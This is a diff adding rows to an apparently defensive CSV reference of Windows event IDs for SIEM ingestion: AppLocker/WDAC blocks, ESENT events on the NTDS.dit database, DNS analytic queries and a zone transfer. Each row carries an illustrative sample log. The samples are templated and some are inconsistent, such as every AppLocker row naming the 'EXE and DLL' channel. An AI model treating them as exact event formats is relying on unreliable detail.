+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+The AppLocker policy was changed/applied.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8004,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,AppLocker blocked an EXE or DLL from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8004
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+AppLocker blocked an EXE or DLL from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8007,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,AppLocker blocked a script or Windows Installer (MSI) file from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8007
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+AppLocker blocked a script or Windows Installer (MSI) file from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8008,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,AppLocker was disabled or a rule collection is not being enforced.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8008
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+AppLocker was disabled or a rule collection is not being enforced.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8022,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A packaged app (MSIX/Appx) was prevented from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8022
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A packaged app (MSIX/Appx) was prevented from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8025,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A packaged app (MSIX/Appx) was prevented from running (packaged app deployment).,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8025
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A packaged app (MSIX/Appx) was prevented from running (packaged app deployment).
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8027,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A packaged app failed to run because no packaged app rule allowed it.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8027
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A packaged app failed to run because no packaged app rule allowed it.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8029,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A Windows Defender Application Control (WDAC) policy prevented a file or package from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8029
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A Windows Defender Application Control (WDAC) policy prevented a file or package from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8032,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A ManagedInstaller script check succeeded.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8032
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A ManagedInstaller script check succeeded.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8035,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A ManagedInstaller script check failed.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8035
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A ManagedInstaller script check failed.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8036,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A Windows Defender Application Control (WDAC) policy prevented a file or package from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8036
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A Windows Defender Application Control (WDAC) policy prevented a file or package from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8040,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,A Windows Defender Application Control (WDAC) policy prevented a file or package from running.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8040
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+A Windows Defender Application Control (WDAC) policy prevented a file or package from running.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+1017,System,Microsoft-Windows-Kernel-General,Windows Systems Log,Handle scavenged,The kernel object manager scavenged (reclaimed) a leaked or long-held handle.,"Log Name:      System
+Source:        Microsoft-Windows-Kernel-General
+Event ID:      1017
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+Handle scavenged: Process ID 4820 had a handle open for an unusually long time and it was reclaimed.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+216,Application,ESENT,Windows Extensible Storage Engine Technology (ESENT) Application,,The Extensible Storage Engine (ESE) database location was changed.,"Log Name:      Application
+Source:        ESENT
+Event ID:      216
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The Extensible Storage Engine (ESE) database location was changed.
+
+Instance:	NTDS
+Database:	C:\Windows\NTDS\ntds.dit","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+325,Application,ESENT,Windows Extensible Storage Engine Technology (ESENT) Application,,A new ESE database (e.g. a new NTDS.dit) was created.,"Log Name:      Application
+Source:        ESENT
+Event ID:      325
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A new ESE database (e.g. a new NTDS.dit) was created.
+
+Instance:	NTDS
+Database:	C:\Windows\NTDS\ntds.dit","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+326,Application,ESENT,Windows Extensible Storage Engine Technology (ESENT) Application,,An NTDS.dit database file was mounted.,"Log Name:      Application
+Source:        ESENT
+Event ID:      326
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+An NTDS.dit database file was mounted.
+
+Instance:	NTDS
+Database:	C:\Windows\NTDS\ntds.dit","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+327,Application,ESENT,Windows Extensible Storage Engine Technology (ESENT) Application,,An ESE database was detached.,"Log Name:      Application
+Source:        ESENT
+Event ID:      327
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+An ESE database was detached.
+
+Instance:	NTDS
+Database:	C:\Windows\NTDS\ntds.dit","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+637,Application,ESENT,Windows Extensible Storage Engine Technology (ESENT) Application,,A new flush map file was created for an ESE database.,"Log Name:      Application
+Source:        ESENT
+Event ID:      637
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A new flush map file was created for an ESE database.
+
+Instance:	NTDS
+Database:	C:\Windows\NTDS\ntds.dit","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+22,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,Microsoft-Windows-TerminalServices-LocalSessionManager,Remote Desktop Services / Terminal Services Session,,A shell start notification was received for a Remote Desktop Services session.,"Log Name:      Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
+Source:        Microsoft-Windows-TerminalServices-LocalSessionManager
+Event ID:      22
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Remote Desktop Services: Shell start notification received:
+
+User: CORP\j.doe
+Session ID: 3","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+3077,Microsoft-Windows-CodeIntegrity/Operational,Microsoft-Windows-CodeIntegrity,Windows Defender Application Control,,A Windows Defender Application Control (WDAC) policy blocked a file from loading.,"Log Name:      Microsoft-Windows-CodeIntegrity/Operational
+Source:        Microsoft-Windows-CodeIntegrity
+Event ID:      3077
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+Code Integrity determined that a process (Process ID: 8040) attempted to load C:\Temp\unsigned-tool.exe that did not meet the WDAC policy signing requirements. This file was blocked.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+3089,Microsoft-Windows-CodeIntegrity/Operational,Microsoft-Windows-CodeIntegrity,Windows Defender Application Control,,Windows Defender Application Control (WDAC) logged the signature information for an evaluated file.,"Log Name:      Microsoft-Windows-CodeIntegrity/Operational
+Source:        Microsoft-Windows-CodeIntegrity
+Event ID:      3089
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Signature information for another event.
+
+File Name:	C:\Program Files\CorpApp\corpapp.exe
+Signer:	CN=Contoso Code Signing, O=Contoso Ltd
+Hash:	(SHA-256)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+257,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server successfully responded to a query.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      257
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server successfully responded to a query.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+258,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server failed to respond to a query.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      258
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server failed to respond to a query.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+259,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server ignored a query.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      259
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server ignored a query.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+260,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server sent a recursive query out to another DNS server.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      260
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server sent a recursive query out to another DNS server.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+261,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server received a response to a recursive query.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      261
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server received a response to a recursive query.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+262,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,A recursive query issued by the DNS server timed out.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      262
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A recursive query issued by the DNS server timed out.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+263,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server received a dynamic update request.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      263
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server received a dynamic update request.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+264,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server sent a response to a dynamic update request.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      264
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server sent a response to a dynamic update request.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+277,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server forwarded a dynamic update request.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      277
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server forwarded a dynamic update request.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+278,Microsoft-Windows-DNSServer/Analytical,Microsoft-Windows-DNS-Server-Service,DNS Server Analytic,,The DNS server received a response to a forwarded dynamic update request.,"Log Name:      Microsoft-Windows-DNSServer/Analytical
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      278
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server received a response to a forwarded dynamic update request.
+
+QName:	app01.corp.local
+QType:	A (1)
+Client IP:	10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+6001,Microsoft-Windows-DNS-Server/Operational,Microsoft-Windows-DNS-Server-Service,DNS Server Zone Transfer,,The DNS server successfully completed a zone transfer.,"Log Name:      Microsoft-Windows-DNS-Server/Operational
+Source:        Microsoft-Windows-DNS-Server-Service
+Event ID:      6001
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The DNS server has completed a zone transfer for zone corp.local to secondary server DC02.corp.local.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
